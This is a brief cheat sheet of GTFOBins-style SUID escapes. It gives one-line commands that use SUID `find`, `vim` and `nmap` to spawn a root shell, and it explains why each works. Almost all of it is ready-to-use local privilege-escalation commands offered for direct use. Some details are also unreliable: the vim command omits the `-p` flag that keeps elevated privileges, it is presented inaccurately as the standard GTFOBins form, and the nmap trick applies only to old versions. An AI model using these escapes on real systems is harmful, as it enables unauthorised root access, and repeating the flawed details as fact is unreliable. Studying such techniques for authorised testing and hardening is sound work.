# GTFOBins SUID Escapes

Below are the standard GTFOBins escape invocations for the three binaries when they carry the **SUID bit**:

---

## `find`

```bash
find . -exec /bin/sh -p \; -quit
```

- `-exec` runs the specified command for each match.
- `/bin/sh -p` preserves the **effective** (SUID) privileges.
- `-quit` stops `find` after the first match so you drop straight into the shell.

---

## `vim`

```bash
vim -c ':!/bin/sh'
```

- `-c ':!/bin/sh'` executes a shell command from within `vim`'s command line.
- Because `vim` is SUID, the spawned `/bin/sh` inherits the elevated privileges.

---

## `nmap`

```bash
nmap --interactive
```

Then, at the `nmap>` prompt:

```
!sh
```

- `--interactive` starts `nmap`'s built-in interactive mode.
- The `!` prefix in that mode executes a **system shell** command, so `!sh` drops you into a privileged shell.

---

> **Key takeaway:** All three escapes work because the binary retains its **SUID effective UID** when it spawns or executes the child process (`/bin/sh`), giving you a shell running as the file's owner (typically `root`).